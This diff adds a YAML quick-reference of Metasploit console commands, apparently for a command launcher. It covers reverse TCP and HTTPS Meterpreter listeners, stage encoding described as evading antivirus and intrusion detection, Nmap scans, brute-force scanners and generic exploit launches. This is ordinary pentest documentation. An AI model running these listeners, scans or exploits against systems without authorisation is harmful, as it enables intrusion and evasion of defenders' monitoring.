@@ -1,0 +1,98 @@
+tool: msfconsole
+tags: [pentest, exploitation, network, security, enumeration, framework, post-exploitation]
+
+actions:
+  # === CORE OPERATIONS ===
+  - title: msfconsole - launch quiet
+    desc: |
+      Start the Metasploit console without displaying the large ASCII art banner. 
+      This is useful for keeping the terminal clean or when piping output to other tools. 
+      It speeds up the startup process slightly and is preferred in automated environments.
+    command: "msfconsole -q"
+
+  - title: msfconsole - execute specific command
+    desc: |
+      Run a specific set of Metasploit commands directly from the system shell and then remain in the console. 
+      This is highly effective for automating the initial setup of a module or handler. 
+      You can chain multiple commands by separating them with semicolons within the quotes.
+    command: "msfconsole -x \"{{command|help}}\""
+
+  - title: msfconsole - run resource file
+    desc: |
+      Execute a series of Metasploit commands stored in an external file (resource script). 
+      Resource files (.rc) are essential for consistent environment setup, such as configuring database connections or complex listeners. 
+      Using scripts helps avoid manual entry errors during critical phases of a penetration test.
+    command: "msfconsole -r {{resource_file|setup.rc}}"
+
+  - title: msfconsole - search for modules
+    desc: |
+      Search the Metasploit database for specific exploits, payloads, or auxiliary modules based on a keyword. 
+      The results can be filtered by platform, rank, or CVE ID to quickly find the most relevant exploit for a target. 
+      This command is the primary method for discovering capabilities within the framework.
+    command: "msfconsole -q -x \"search {{keyword}}; exit\""
+
+  # === HANDLERS & LISTENERS ===
+  - title: msfconsole - windows reverse tcp handler
+    desc: |
+      Establish a multi-handler listener for a Windows 32-bit staged Meterpreter reverse TCP connection. 
+      This is the standard listener used for most basic Windows exploitations where a stable callback is expected. 
+      Ensure your firewall allows incoming connections on the specified LPORT.
+    command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {{lhost}}; set LPORT {{lport|4444}}; run\""
+
+  - title: msfconsole - windows reverse https handler
+    desc: |
+      Set up a listener for a Windows 64-bit staged Meterpreter connection over HTTPS. 
+      Using HTTPS is a common technique for bypassing deep packet inspection (DPI) and egress filtering. 
+      The traffic is encrypted, making it look like legitimate web browsing to many network monitoring tools.
+    command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; run\""
+
+  - title: msfconsole - windows reverse https unstaged handler
+    desc: |
+      Configure a listener for an unstaged (standalone) Windows 64-bit reverse HTTPS payload. 
+      Unstaged payloads do not require a second stage download, making them more resilient in unstable network conditions. 
+      Note that the resulting executable file will be significantly larger than a staged version.
+    command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; run\""
+
+  - title: msfconsole - encoded stage handler
+    desc: |
+      Launch a listener that applies encoding to the payload stage before sending it to the target. 
+      This technique is used to evade signature-based antivirus or network intrusion detection systems that scan the second stage transfer. 
+      The x64/xor_dynamic encoder is a popular choice for modern 64-bit Windows targets.
+    command: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST {{lhost}}; set LPORT {{lport|443}}; set EnableStageEncoding true; set StageEncoder {{encoder|x64/xor_dynamic}}; run\""
+
+  # === DATABASE & RECONNAISSANCE ===
+  - title: msfconsole - database nmap scan
+    desc: |
+      Execute an Nmap scan from within Metasploit and automatically save the results into the internal database. 
+      This allows you to track discovered hosts, open ports, and services within a unified workspace. 
+      A running PostgreSQL database is required for the information to be stored permanently.
+    command: "msfconsole -q -x \"db_nmap {{nmap_flags|-sV}} {{target}}; exit\""
+
+  - title: msfconsole - export database
+    desc: |
+      Export all data from the current workspace, including hosts, services, and discovered credentials, to an XML file. 
+      This is a vital step for documentation, reporting, or moving data between different Metasploit installations. 
+      The exported file can be re-imported later using the db_import command.
+    command: "msfconsole -q -x \"db_export -f xml {{output_path|results.xml}}; exit\""
+
+  - title: msfconsole - manage workspaces
+    desc: |
+      List all existing workspaces within the Metasploit database or create a new one. 
+      Workspaces allow you to segregate data for different projects or networks, preventing target confusion. 
+      It is best practice to create a unique workspace for every new engagement.
+    command: "msfconsole -q -x \"workspace -a {{workspace_name|project_alpha}}; workspace; exit\""
+
+  # === EXPLOITATION EXAMPLES ===
+  - title: msfconsole - run auxiliary scanner
+    desc: |
+      Execute an auxiliary module to perform tasks like port scanning, service identification, or brute-forcing. 
+      Auxiliary modules are used for information gathering and do not typically provide a shell. 
+      This example shows how to run a generic scanner against a specific target range.
+    command: "msfconsole -q -x \"use {{module|auxiliary/scanner/portscan/tcp}}; set RHOSTS {{target}}; run; exit\""
+
+  - title: msfconsole - execute exploit with auto-target
+    desc: |
+      Quickly launch a specific exploit module against a target while letting Metasploit attempt to determine the target OS/version automatically. 
+      This command uses the 'run' command with pre-set variables for target and host settings. 
+      Always verify the module options with the 'options' command before executing in a production environment.
+    command: "msfconsole -q -x \"use {{exploit_path}}; set RHOSTS {{target}}; set LHOST {{lhost}}; run\""
